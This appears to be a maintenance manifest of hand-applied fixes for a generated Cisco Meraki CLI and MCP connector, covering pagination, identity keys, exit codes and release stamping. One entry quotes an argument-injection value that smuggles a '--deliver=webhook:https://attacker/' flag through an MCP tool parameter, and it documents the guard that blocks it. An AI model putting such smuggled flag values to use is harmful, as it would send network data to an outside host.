_comment: Connector-specific edits that a cli-printing-press reprint must NOT clobber. First print 2026-10-13, press 4.33.5 (factory run ~/Documents/Dev/cli-factory/cisco-meraki). Spec-encoded fixes live in that run's spec/spec-overlay.json; generated-file call sites are re-applied by its tools/apply_handfixes.py after every generate --force (which drops them).

handfixes.summary: sync, --all (array and object envelopes) and fleet commands follow the Meraki Link header (rel=next carries startingAfter); a live page without rel=next is a proven end; repeated or cycling cursors stop the walk as incomplete (walkCursors) instead of looping
handfixes.why: Every Meraki list endpoint is a bare JSON array paged ONLY by the RFC 5988 Link header. The press reads cursors from JSON bodies and classifies perPage-only params as offset paging with no cursor (pagination_undeterminable x157), so sync and --all silently stopped after page one. Helpers live in hand-authored internal/cli/meraki_link_pagination.go (client hook wraps the transport); 8 call sites in generated sync.go/helpers.go are re-applied by tools/apply_handfixes.py. TestPaginatedGetAllFollowsLinkHeader fails if they are dropped.
handfixes.spec_encode_followup: Not spec-encodable on press 4.33.5 (x-pp-pagination accepts only 'none'; no response-header cursor support). File a press retro for Link-header pagination.

asserts.contains: nextCursor, hasMore = linkAdvance(linkPage, pageSize, nextCursor, hasMore)

handfixes.summary: All 399 array query params send name[] (statuses[]=offline), via x-url-name in the spec overlay
handfixes.why: Meraki only honors bracketed array keys (the official Python SDK rewrites every array param to k[]). The OpenAPI declares bare names with form/explode, so generated commands sent statuses=offline and the filter was silently ignored, returning unfiltered results.
handfixes.spec_encode_followup: Spec-encoded: x-url-name "<name>[]" on every array query param in spec/spec-overlay.json. Keep it on any spec refresh.

handfixes.summary: Spec overlay: numeric-string maximum/minimum coerced to numbers; 26 deep request-body objects collapsed to one JSON flag; x-resource-id on 7 org resources; examples on all path + required query params; per-op security referencing the undefined oauth2 scheme removed (849 ops); info.contact.url/x-website set to the Dashboard API docs and x-auth-key-url to Meraki's key how-to; perPage minimum/maximum encoded from each endpoint's documented 'Acceptable range' (179 params) so sync page sizes stay within limits
handfixes.why: kin-openapi rejects string maximums (generation fails); flattened nested body names exceeded the 64-char MCP property-key limit (generation fails); devices were keyed by display name (non-unique); with no param examples the generator omitted Example lines (0% example coverage).
handfixes.spec_encode_followup: Spec-encoded in spec/spec-overlay.json (tools/collapse_long_body_fields.py rebuilds the collapse on a fresh upstream spec).

handfixes.summary: README/SKILL/AGENTS template boilerplate corrected by tools/apply_handfixes.py (DOC_PATCHES) (in msp-skills the source README is vendored as guide.md, so the README patches land there)
handfixes.why: Press templates render a devices get mock-value sample, an MCP install line without the API key env, a config path derived from the spec title (meraki-dashboard-pp-cli), CISCO_MERAKI_BASEPATH instead of CISCO_MERAKI_BASE_PATH, a --yes confirmation claim the CLI does not enforce, exit-code tables without 1, and <command> placeholders.
handfixes.spec_encode_followup: Template defects; press retro. Re-run tools/apply_handfixes.py after every generate.

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs. Guarded call site: handleLocateAMacFromASocAlert (the locate_a_mac_from_a_soc_alert intent, `fleet find <ref>`).
handfixes.why: Reachable here: press 4.33.5 still emits the unguarded recipe path, and internal/mcp/intents.go handleLocateAMacFromASocAlert called appendRecipePositional(args, input["ref"], true) with no check, so the MCP tool call {"ref": "--deliver=webhook:https://attacker/"} ran `fleet find --deliver=webhook:https://attacker/ --agent` and pflag parsed the value as the denylisted root --deliver flag (proven on this connector 2026-10-13: with the guard stubbed out, TestRecipeIntentLocateAMacFromASocAlertRejectsFlagLikePositional fails showing exactly that argv; with the guard it passes). Fleet origin: found by Codex adversarial review of the mcp-argv-value-joined backport (2026-09-09); upstream cli-printing-press fixed cliArgsFromMCP (#4647, present in 4.33.5's shellout.go) but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. The factory's tools/apply_handfixes.py re-applies the intents.go edit after a regenerate; the two tests in recipe_intents_test.go must be restored by hand. Mirrors cobratree.validatePositionalArgsForMCP. Retire only when the press generator refuses flag-like recipe positionals itself.

handfixes.summary: The MCP cisco-meraki_execute tool marks a GET result has_more when the response's Link header names another page: with next_starting_after when the whole upstream page fit in the (50-item) MCP result, and, when the result was truncated to fit (a bare array marked truncated, or an object envelope marked _pp_truncated, including a truncated last page), a note to re-request with a smaller perPage instead of a cursor that would skip the cut items
handfixes.why: Every non-fleet operation reaches MCP agents through cisco-meraki_execute, which sends one GET and dropped the Link header, so an agent asking for network clients (default perPage 10 on many endpoints) silently got page one - the failure meraki-link-pagination fixed for sync, --all and fleet but not this twin path. Found by the fresh-context adversarial review (2026-10-13). The result is already capped at 50 items per MCP call, so the fix reports the cursor rather than walking every page. Helpers live in the hand-authored internal/cli/meraki_link_pagination.go (WithMerakiLinkNext, AnnotateMerakiNextPage); the three call-site lines in generated code_orch.go are re-applied by the factory's tools/apply_handfixes.py. TestCodeOrchExecuteReportsMerakiNextPage fails with the annotation removed (proven 2026-10-13). Round-2 adversarial review (2026-10-13) caught that the first version offered the Link cursor even when bound truncated a large page to 50 items, so following it skipped items 51..perPage; TestCodeOrchExecuteTruncatedPageWithholdsCursor fails on that version (proven) and a 1,200-item walk through the real MCP binary following the tool's own instructions returned all 1,200 with no gaps. Round 3 (2026-10-13) caught the object-envelope twin ({items:[...]} cut in place with _pp_truncated, e.g. switch port statuses by switch) and a truncated last page; TestCodeOrchExecuteTruncatedEnvelopeWithholdsCursor fails on the round-2 version (proven), and a 60-switch envelope walk following only the tool's notes returned all 60. Round 4 (2026-10-13): the cut-page note now carries the exact page size for bare arrays (they set both truncated and _pp_truncated), and is emitted only for endpoints that take perPage (codeOrchTakesPerPage, hand-authored internal/mcp/meraki_execute.go) - a switch's 52 ports keep bound's own note instead of advice to shrink a page that does not exist.
handfixes.spec_encode_followup: Not spec-encodable; press retro: execute should surface response-header pagination.

handfixes.summary: doctor reports a 404 from its health path (/administered/identities/me) as a WARN naming CISCO_MERAKI_BASE_URL instead of 'reachable', and the default base URL is the literal https://api.meraki.com/api/v1 (no {basePath} template, no CISCO_MERAKI_BASE_PATH)
handfixes.why: check_doctor_truth.py (issue #282) failed two ways. wrong-base: a base_url whose every API path 404s rendered as 'reachable (HTTP 404 at /)', a health claim for a broken install. placeholder: the gate treats any {var} in the default base URL as an unset placeholder, so the generated https://api.meraki.com/{basePath} - which always resolved to the working api/v1 - made it demand that doctor call a correct global-dashboard install broken. The spec's basePath server variable only ever had one value, so the default is now literal (spec-encoded in the factory's spec/spec-overlay.json servers block, so the next generate emits it natively) and CISCO_MERAKI_BASE_PATH, an env var that only ever selected that one value, is gone from the binary and every install surface. Proven both directions 2026-10-13: the original doctor.go fails the gate's wrong-base state, the fixed one passes all states.
handfixes.spec_encode_followup: Base URL: spec-encoded (overlay servers). doctor 404 verdict: press retro (any non-auth 404 at the health path should be negative).

handfixes.summary: internal/store isoDatePattern escapes the '-' in its timestamp character class ([0-9:.+\-Zz]), so composite IDs such as '<ts>+<SERIAL>' are no longer rejected as dates
handfixes.why: The generated pattern wrote [0-9:.+-Zz]; in a character class '+-Z' is a RANGE (0x2B-0x5A) that covers every uppercase letter. The spec overlay keys organizations_devices_availabilities_change_history on 'ts+device.serial', and a Meraki serial is uppercase alphanumeric, so every change-history row failed ID extraction (all_items_failed_id_extraction), the resource counted as a critical failure, and `sync` (and `sync --resources organizations`, and MCP sync) exited 1 for any org with a device status change in the last day. Found by the round-3 adversarial review (2026-10-13). TestMerakiCompositeTimestampIDIsUsable fails on the unescaped class (proven); after the fix, sync against the factory fake exits 0 with no extraction failures. The same pattern ships in every connector's store.go (66 of 66); it is only reachable where an x-resource-id puts a timestamp first and an all-caps value after it - fleet follow-up.
handfixes.spec_encode_followup: Press retro: escape '-' in isoDatePattern's class. Not spec-encodable (it is template code).

handfixes.summary: When no id-like field resolves, store.ExtractResourceID composes a row identity from Meraki scope/entity fields (network.id or networkId, cluster, policy, profile, SSID number, device serial, gateway/controller serial, client, port, interface/rule-group/policy id, admin/method/path, metric, alertType, url, then a timestamp for history rows); rows that name a device serial use it ahead of the generic display-name fallback
handfixes.why: Round-4 adversarial review (2026-10-13) served every synced organizations dependent its documented 200 example and found 44 (68 by a later full probe) with no field the generated extractor accepts: VPN statuses, uplink statuses, packet loss and usage by device/network/SSID, wireless-controller views, sensor readings, webhook logs, API requests. Every row failed extraction, sync counted each as a critical IntegrityFailure, and `sync`/`sync --resources organizations` exited 1 for nearly any real MSP org (the factory fake 404s ~130 of those paths, which hid it). The composite never starts with a timestamp, so it never reads as a date; a row with only a timestamp still fails honestly. SSID number 0 is accepted (the composite-override path rejects 0). The lastReportedAt+rssi sensor key, which reads as a date, now resolves to network+sensor+gateway serial. Helper is hand-authored internal/store/meraki_identity.go; two call sites in generated store.go. TestMerakiIdentityFallbackKeysDocumentedRows fails without the hook (proven); sync against a stub serving every documented example exits 0 with 447 rows and no extraction failures.
handfixes.spec_encode_followup: Partly spec-encodable: x-resource-id per operation for each of these resources would replace the fallback. Press retro: a dependent with no identity field should not be an IntegrityFailure, or should get a content key.

handfixes.summary: sync's page extractor unwraps an ARRAY of {items, meta} envelopes into the records inside it; fleet fanout's walker (merakiGetAll) does the same, so items_returned counts records; MCP cisco-meraki_execute counts and returns the records too (UnwrapMerakiEnvelopeArray)
handfixes.why: Several Meraki list reads (wireless RF-profile assignments by device, floor-plan auto-locate devices and statuses, SM sentry assignments, wireless-controller failover history, provisioning deployments) answer [{items:[...], meta:{...}}]. The generated extractor took the direct array as the records, stored the envelope (no identity), and the resource failed as critical - RF-profile assignments alone has rows in any org with MR access points. Found while fixing the round-4 sync P1 (2026-10-13). Helper merakiUnwrapEnvelopeArray is hand-authored in internal/cli/meraki_link_pagination.go; the call site in generated sync.go is re-applied by the factory's tools/apply_handfixes.py. TestSyncUnwrapsMerakiEnvelopeArray fails without it (proven). Round-6 adversarial review (2026-10-14): the MCP execute twin still reported count 1 per envelope page; the call site in generated code_orch.go is re-applied by tools/apply_handfixes.py. TestCodeOrchExecuteCountsEnvelopeRecords fails with the call site removed (proven).

handfixes.summary: Mirror row keys for 31 resources the generator keyed on the display name "name" now use the real identity: device serial (switch-port, uplink-address, firmware-by-device, power/CPU/memory history, SSID status and other per-device views), the resource's own id (policyId, profileId, captureId, rulesetId(+ruleId), roleId, subscriptionId, clientId, floorPlanId), policy.id+groupId for intrusion rule groups, network.id+vlanId for VLAN assignments, networkId(+name) for per-network rows; round 6: intrusion rules on policy.id+ruleId (not the Snort gid; the same catalog rule repeats under each policy), the three group-policy assignment lists on assignmentId (not the foreign policyId), and keys that carried a mutable name or URL (XDR networks, campus-gateway connections/network overviews/SSIDs) or a timestamp+RSSI (sensor gateway connections, now sensor.mac+gateway.mac; serial is optional) on their stable identity; campus-gateway network/SSID overviews add cluster.id; MX port profile assignments use device.serial+port.interface.name, and the identity fallback reads port.interface.name because port.interface is an object
handfixes.why: Round-5 adversarial review (2026-10-13): Meraki does not require unique names, so two switches both called "Core Switch" at different sites, same-named firewall rules, or "Data" VLANs in several networks collapsed into one local-mirror row with no warning - sync exited 0, and `search` returned the other switch's port config. Keys are set in both generated maps (internal/store/store.go and internal/cli/sync.go resourceIDFieldOverrides) and spec-encoded as x-resource-id in the factory's spec/spec-overlay.json so the next generate emits them natively. TestMerakiSameNameRowsStayDistinct fails on the generated maps (proven). Round-6 adversarial review (2026-10-14) found the same silent-merge class outside the name keys: gid is 1 for nearly every Snort rule, so an org's IPS rules collapsed to one row, and one policy assigned to several VLANs/rulesets/adaptive groups kept one assignment. A rename of a network or AP left a ghost row under the old name/URL. TestMerakiRowKeysAreOwnIdentity fails on the round-5 maps (proven: intrusion rules got IDs "1" and "1"); e2e against the documented-example stub with a duplicated fixture stores 6 rows (was 3) for each of the four resources, and a --full re-sync keeps 447 rows. Round 7 (adversarial + Codex, 2026-10-14): ruleId alone still merged the same rule across intrusion policies (rule groups were already policy.id+groupId); two ports on one MX sharing a profile merged because port.interface is an object the fallback ignored; sensors without a serial merged per gateway. TestMerakiRowKeysAreOwnIdentity fails on the round-6 maps (proven: 'r-A' and 'r-A'). Round 8 (2026-10-14): reading port.interface.name in the fallback re-keyed MX L3 interfaces to network+port+interfaceId, so an interface that moved ports left a stale row; organizations_appliance_devices_interfaces_l3 now has an explicit network.id+interfaceId override (its pre-round-7 key).
handfixes.spec_encode_followup: Spec-encoded (x-resource-id on each GET in spec/spec-overlay.json). Press retro: never infer a row key from a display name.

handfixes.summary: export walks the Meraki Link header (startingAfter) for perPage-only resources and always bypasses the response cache, so `export organizations` returns every org once; perPage is floored at Meraki's minimum of 3 under --limit
handfixes.why: The generator classifies perPage-only endpoints as offset paging with no offset param. Once a page came back full (a key with 100+ orgs at perPage=100), export re-requested page one until its 100000-page cap, writing duplicates; a cached page also carries no Link header. Found by the round-6 adversarial review (2026-10-14). Helper merakiLinkReadConfig is hand-authored in internal/cli/meraki_link_pagination.go; the call sites in generated export.go are re-applied by the factory's tools/apply_handfixes.py. TestExportFollowsMerakiLinkHeader (250 orgs, 100 per page) fails on the generated export with 'export pagination exceeded 100000 pages' (proven). Round 7 (2026-10-14): --limit 1, 2, 101 or 201 shrank the last page to perPage 1 or 2 and Meraki answered HTTP 400; TestExportLimitRespectsMerakiPerPageMinimum fails without the floor (proven). The forced c.NoCache is now asserted too: without it a second export inside the cache TTL returned page one only.
handfixes.spec_encode_followup: Not spec-encodable on press 4.33.5 (no response-header cursor support). Same press retro as meraki-link-pagination.

asserts.contains:
// header, so the walk would stop at page one; --no-cache is implied.
			c.NoCache = true

handfixes.summary: sync exits 0 when the only non-success results are warnings and rows were stored ('completed with warnings but no successful syncs' fires only when nothing was stored); --strict exits non-zero on any warned or errored resource
handfixes.why: A dependent resource whose parent list includes an org with API access disabled (a normal MSP case) is counted 'warned', never 'success', even after storing every other org's rows, so `sync --resources <dependent>` exited 1 with 'no successful syncs' - contradicting the sync help ('Exit 0 when at least one resource synced'). Found by the round-6 adversarial review (2026-10-14). Receipt: against the factory fake (Dormant Org 600003), `sync --resources organizations_devices_statuses` stored 7 rows and exited 1 before, exits 0 after; a warn-only run that stored nothing still exits 1. The edit in generated sync.go is re-applied by the factory's tools/apply_handfixes.py. Round 7 (2026-10-14): the first version also let --strict exit 0 on a warned dependent whose parents returned 500, contradicting --strict's help; --strict now fails any warned resource. Round 8 (2026-10-14): the round-7 '|| strict' sat inside the successCount == 0 branch, so a normal `sync --strict` with a warned dependent still exited 0; --strict is now its own check beside the generated errCount one.
handfixes.spec_encode_followup: Not spec-encodable; press retro: count a warned resource that stored rows toward the exit-0 rule.

handfixes.summary: sync stores an object page that names its own network or device (networkId/serial) as one record, ahead of the generic single-array-sibling heuristic, so its only array of sub-objects is not taken for the records and an empty array does not read as an empty page
handfixes.why: GET /organizations/{organizationId}/appliance/devices/redundancy/byNetwork (MX warm-spare settings) is documented as one object per network with a single array (designations). The generated extractor's single-array-sibling heuristic stored only {serial, priority} and dropped networkId, mode and uplink settings, with sync exiting 0. Found by Codex review (2026-10-14). Applied only where that heuristic fires, so every other envelope shape is unchanged. Helper merakiRecordObject is hand-authored in internal/cli/meraki_link_pagination.go; the call site in generated sync.go is re-applied by the factory's tools/apply_handfixes.py. TestSyncKeepsMerakiRecordObject fails without it (proven). Round 8 (2026-10-14): applied only where the heuristic fired, a network with warm spare disabled (designations: []) still read as an empty page and its earlier active-active row was never replaced; the check now runs before the heuristic. Across every synced resource's documented example it fires only for redundancy byNetwork.
handfixes.spec_encode_followup: Not spec-encodable; press retro: never treat an object carrying its own identity as an envelope.

handfixes.summary: fleet push --apply exits 6 (partial failure) when a target network's change did not land - batch rejected, failed, pending after --wait, or current settings unreadable - and the error names each network (the MCP tool returns only stderr on a non-zero exit)
handfixes.why: Codex review (2026-10-14): a batch POST answered HTTP 400 and fleet push --apply printed 'rejected' but exited 0 with empty stderr, so automation and the companion MCP tool reported success although nothing changed. fleet_push.go is hand-authored (novel command); TestFleetPushApplyExitsPartialOnRejectedBatch fails on the prior version (proven). Codex round 2 + adversarial round 8 (2026-10-14): a target whose settings GET returned 403 got action 'error', no batch, and exit 0; and the MCP fleet_push tool, which drops stdout on a non-zero exit, gave the agent no per-network status. TestFleetPushApplyExitsPartialOnUnreadableTarget fails on the prior version (proven). An org whose network list fails stays a stderr warning, as in every fleet command.

handfixes.summary: configuration_changes and intrusion-rule rows are keyed positionally with empty slots for parts Meraki leaves null (ts+networkId+ssidNumber+adminId+page+label; ruleId+policy.id), ahead of the all-parts-required generated override
handfixes.why: Codex round 2 (2026-10-14): a configuration change made by Meraki support or an automated process has adminId null, so the generated ts+adminId+page+label composite failed and the fallback keyed on network+timestamp: two changes in the same second on one network (an L3 and an L7 rule edit) overwrote each other and sync exited 0. Round 8 found the same shape on intrusion rules without policy.id, which fell to the generic gid fallback (gid is 1 for nearly every rule). Helper merakiNullableCompositeID is hand-authored in internal/store/meraki_identity.go; the call site at the top of generated ExtractResourceID is re-applied by the factory's tools/apply_handfixes.py. TestMerakiNullableCompositeKey fails on the prior code (proven).
handfixes.spec_encode_followup: Not spec-encodable (x-resource-id has no optional-part syntax); press retro: composite keys should tolerate null parts.

handfixes.summary: cisco-meraki-mcp declares var version (package main) and passes it to server.NewMCPServer, so release.yml's -X main.version stamps serverInfo.version
handfixes.why: Codex round 2 (2026-10-14): the generated MCP main.go kept the 'version is ... overridable via ldflags' comment but hard-coded "0.0.0-dev" with no var, so -X main.version was silently ignored and the release workflow's serverInfo.version probe would fail the release. Every other connector's MCP main.go declares the var. Receipt: built with -X main.version=0.1.0, initialize returns serverInfo.version 0.1.0. Re-applied by the factory's tools/apply_handfixes.py.
handfixes.spec_encode_followup: Press retro: the MCP main template lost its version var under 4.33.5 for this print.
